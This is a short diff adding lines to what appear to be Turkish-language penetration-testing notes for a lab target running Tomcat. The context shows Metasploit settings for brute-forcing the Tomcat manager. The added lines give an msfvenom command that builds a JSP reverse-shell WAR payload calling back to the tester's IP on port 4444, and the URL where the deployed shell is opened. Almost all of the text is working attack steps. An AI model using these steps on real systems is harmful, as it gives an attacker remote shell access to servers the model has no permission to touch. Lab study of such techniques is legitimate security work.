@@ -92,6 +92,10 @@ set RPORT 8080
 set TARGETURI /manager/html
 set BRUTEFORCE_SPEED 5
 run
+
+
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=[SİZİN_İP] LPORT=4444 -f war > shell.war
+http://10.129.201.50:8080/shell/
 ```
 
 # Directory Enumeration
